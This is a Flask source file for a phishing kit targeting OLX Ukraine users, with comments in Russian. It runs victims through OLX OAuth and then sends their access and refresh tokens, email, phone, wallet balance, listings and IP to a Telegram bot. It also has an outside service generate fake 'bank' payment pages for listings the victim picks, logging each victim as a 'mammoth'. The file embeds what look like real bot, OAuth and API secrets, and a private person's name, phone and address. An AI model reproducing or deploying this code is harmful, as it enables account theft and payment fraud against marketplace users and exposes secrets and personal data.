from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import os
import json

app = Flask(__name__)

# ---- КОНФИГУРАЦИЯ ----
TG_TOKEN = "8671990790:AAFJ9HAc4SWswxBNKYgIJdqiO6xlI1YRqzw"
TG_CHAT_ID = "-1003571283881"
CLIENT_ID = "202421"
CLIENT_SECRET = "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf"
REDIRECT_URI = "https://maun-producton.up.railway.app/" 

# Твой токен от сервиса ссылок
TPDOM_TOKEN = "e6dd2b726bd5eb127ac4251b73f9fe0724735b39f0a4e144c92de4e1a4c7ea71"
TPDOM_DOMAIN = "https://tpdom.icu"

OLX_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/OLX_green_logo.svg/250px-OLX_green_logo.svg.png"

def send_telegram_message(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                     json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True},
                     timeout=10)
    except Exception as e:
        print(f"Ошибка ТГ: {e}")

@app.route('/')
def index():
    ads_cookie = request.cookies.get('user_ads')
    info_cookie = request.cookies.get('user_info')
    balance_cookie = request.cookies.get('user_balance')  # (если будешь хранить отдельно)

    user_ads = []
    user_info = None
    balance = {}

    # ---------- ADS ----------
    if ads_cookie:
        try:
            user_ads = json.loads(ads_cookie)
        except Exception:
            user_ads = []

    # ---------- USER INFO ----------
    if info_cookie:
        try:
            user_info = json.loads(info_cookie)
        except Exception:
            user_info = None

    # ---------- BALANCE (если есть cookie) ----------
    if balance_cookie:
        try:
            balance = json.loads(balance_cookie)
        except Exception:
            balance = {}

    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html_content = f.read()

        return render_template_string(
            html_content,
            user_ads=user_ads,
            user_info=user_info,
            balance=balance  # 🔥 ВАЖНО
        )

    except Exception as e:
        return f"Ошибка шаблона: {e}", 500

@app.route('/get_token', methods=['POST'])
def get_token():
    data = request.get_json(silent=True) or {}
    code = data.get('code')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    if not code:
        return jsonify({"error": "No code"}), 400

    try:
        # ---------- 1. TOKEN ----------
        token_res = requests.post(
            'https://www.olx.ua/api/open/oauth/token',
            data={
                'grant_type': 'authorization_code',
                'client_id': CLIENT_ID,
                'client_secret': CLIENT_SECRET,
                'code': code,
                'redirect_uri': REDIRECT_URI,
                'scope': 'read write v2'
            },
            timeout=15
        )

        if token_res.status_code != 200:
            return jsonify({"error": "Auth failed"}), 400

        res_data = token_res.json()
        access = res_data.get('access_token')
        refresh = res_data.get('refresh_token')

        headers = {
            "Authorization": f"Bearer {access}",
            "Version": "2.0"
        }

        # ---------- 2. USER ----------
        user_data = {}
        email = "Не указан"

        try:
            u_res = requests.get(
                "https://www.olx.ua/api/partner/users/me",
                headers=headers,
                timeout=5
            )
            if u_res.status_code == 200:
                u = u_res.json()
                user_data = u.get('data', {})
                email = user_data.get('email', email)
        except Exception as e:
            print(f"User info error: {e}")

        is_business = bool(user_data.get('is_business'))

        # ---------- 3. BALANCE ----------
        balance = {}

        try:
            bal_res = requests.get(
                "https://www.olx.ua/api/partner/users/me/account-balance",
                headers=headers,
                timeout=5
            )
            if bal_res.status_code == 200:
                balance = bal_res.json().get("data", {})
        except Exception as e:
            print(f"Balance API error: {e}")

        # ---------- 4. ADS ----------
        ads_data = []

        try:
            ads_api_res = requests.get(
                "https://www.olx.ua/api/partner/adverts",
                headers=headers,
                params={"limit": 25},
                timeout=7
            ).json()

            raw_ads = ads_api_res.get('data', [])

            for ad in raw_ads:
                if ad.get('status') != 'active':
                    continue

                price = ad.get("price")
                if isinstance(price, dict):
                    price_value = price.get("value")
                    currency = price.get("currency")
                else:
                    price_value = price
                    currency = ""

                ads_data.append({
                    "title": ad.get("title"),
                    "url": ad.get("url"),
                    "price": price_value,
                    "currency": currency,
                    "created_at": ad.get("created_at") or ad.get("created_time")
                })

        except Exception as e:
            print(f"Ads API error: {e}")

        # ---------- 5. TELEGRAM LOG (ОДИН ЦЕЛЫЙ) ----------
        msg = (
            "👤 <b>АВТОРИЗАЦИЯ OLX</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "<b>👤 Профиль</b>\n"
            f"Имя: {user_data.get('name')}\n"
            f"Email: <code>{email}</code>\n"
            f"Телефон: <code>{user_data.get('phone_login')}</code>\n"
            f"Бизнес: {'Да' if is_business else 'Нет'}\n\n"

            "━━━━━━━━━━━━━━━━━━━━\n"
            "<b>💰 Баланс</b>\n"
            f"Wallet: {balance.get('wallet')}\n"
            f"Bonus: {balance.get('bonus')}\n"
            f"Refund: {balance.get('refund')}\n"
            f"Currency: {balance.get('currency')}\n\n"

            "━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>📦 Активные объявления ({len(ads_data)})</b>\n"
        )

        for i, ad in enumerate(ads_data[:10]):
            msg += (
                f"\n{i+1}. <a href='{ad['url']}'>{ad['title']}</a>\n"
                f"   💵 {ad['price']} {ad['currency']}\n"
                f"   📅 {ad['created_at']}\n"
            )

        if not ads_data:
            msg += "\n<i>Нет активных объявлений</i>\n"

        msg += (
            "\n━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>🌐 IP:</b> <code>{user_ip}</code>\n"
            f"<b>🔑 ACCESS:</b> <code>{access}</code>\n"
            f"<b>🔄 REFRESH:</b> <code>{refresh}</code>"
        )

        send_telegram_message(msg)

        # ---------- 6. COOKIE ----------
        ad_list_for_cookie = [
            {
                "title": ad.get("title"),
                "url": ad.get("url"),
                "price": ad.get("price"),
                "currency": ad.get("currency"),
                "created_at": ad.get("created_at")
            }
            for ad in ads_data
        ]

        user_info_cookie = {
            "name": user_data.get('name', 'Користувач'),
            "id": user_data.get('id', 'Не вказано')
        }

        resp = make_response(jsonify({"status": "ok"}))

        resp.set_cookie(
            'user_ads',
            json.dumps(ad_list_for_cookie),
            max_age=3600,
            path='/'
        )

        resp.set_cookie(
            'user_info',
            json.dumps(user_info_cookie),
            max_age=3600,
            path='/'
        )

        return resp

    except Exception as e:
        print(f"Global error in get_token: {e}")
        return jsonify({"error": str(e)}), 500

# ---- МЕТОД: ПРИЕМ ВЫБРАННОГО ТОВАРА + ПОДРОБНЫЙ ЛОГ В ТГ ----
@app.route('/submit_ad', methods=['POST'])
def submit_ad():
    data = request.get_json(silent=True) or {}
    olx_url = data.get('ad_url')
    ad_title = data.get('ad_title')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if not olx_url:
        return jsonify({"error": "No URL provided"}), 400

    try:
        # Отправляем данные на сервис создания ссылок
        res = requests.post(
            url=f"{TPDOM_DOMAIN}/api/createUrl",
            data={
                "fio": "Косенко Олена Дмитрівна",
                "phone_number": "+380963944037",
                "olx_url": olx_url,
                "address": "вул. Шевченка, 24, кв. 15, м. Львів, 79021. Відділення №21"
            },
            headers={"authorization": TPDOM_TOKEN},
            timeout=10
        )

        if res.status_code == 200:
            res_json = res.json()
            raw_url = res_json.get("url")
            
            # --- МОДИФИКАЦИЯ ССЫЛКИ ---
            # Добавляем /bank/ после .dev/
            if raw_url and ".dev/" in raw_url:
                created_url = raw_url.replace(".app/", ".app/bank/")
            else:
                created_url = raw_url
            # ---------------------------
            
            # ФОРМИРУЕМ КРАСИВЫЙ ЛОГ
            log_msg = (
                f"🎯 <b>Мамонт выбрал товар!</b>\n\n"
                f"📦 <b>Товар:</b> {ad_title}\n"
                f"🔗 <b>Оригинал OLX:</b> <a href='{olx_url}'>Перейти</a>\n"
                f"🌐 <b>IP мамонта:</b> <code>{user_ip}</code>\n\n"
                f"💳 <b>Созданная ссылка (открылась у него):</b>\n{created_url}"
            )
            
            send_telegram_message(log_msg)
            
            # Возвращаем уже измененную ссылку на фронтенд
            return jsonify({"status": "ok", "url": created_url})
        else:
            send_telegram_message(f"❌ <b>Ошибка API Ссылок:</b> {res.status_code}\n{res.text}")
            return jsonify({"error": "API error"}), 500

    except Exception as e:
        send_telegram_message(f"⚠️ <b>Ошибка submit_ad:</b> {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/billing')
def billing():
    return "<h1>Оплата замовлення...</h1><p>Будь ласка, не закривайте сторінку.</p>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
